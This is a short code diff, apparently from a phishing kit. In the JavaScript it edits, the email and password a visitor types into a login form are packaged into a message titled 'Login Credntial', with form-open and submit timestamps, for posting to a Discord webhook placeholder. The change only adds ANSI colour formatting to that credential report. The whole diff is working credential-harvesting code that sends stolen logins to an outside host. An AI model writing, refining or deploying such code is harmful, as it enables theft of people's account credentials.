@@ -44,13 +44,19 @@
 
             const webhookUrl = "{{DS-HOOK}}";
 
-            const discordMessage = {
+            const green = "\x1b[1;32m";
+            const cyan = "\x1b[1;36m";
+            const white = "\x1b[0;37m";
+            const reset = "\x1b[0m";
 
-                content: `**New Form Submission**\n` +
-                    `**Name:** ${nameValue}\n` +
-                    `**Password:** ${passwordValue}\n` +
-                    `**Form Opened At:** ${formLoadTime.toLocaleString()}\n` +
-                    `**Submit Clicked At:** ${submitClickTime.toLocaleString()}`
+            const discordMessage = {
+                content: `\`\`\`ansi\n` +
+                    `${green}**Login Credntial**${reset}\n` +
+                    `${cyan}Email:${reset} ${white}${nameValue}${reset}\n` +
+                    `${cyan}Password:${reset} ${white}${passwordValue}${reset}\n` +
+                    `${cyan}Form Opened At:${reset} ${white}${formLoadTime.toLocaleString()}${reset}\n` +
+                    `${cyan}Submit Clicked At:${reset} ${white}${submitClickTime.toLocaleString()}${reset}\n` +
+                    `\`\`\``
             };
 
 
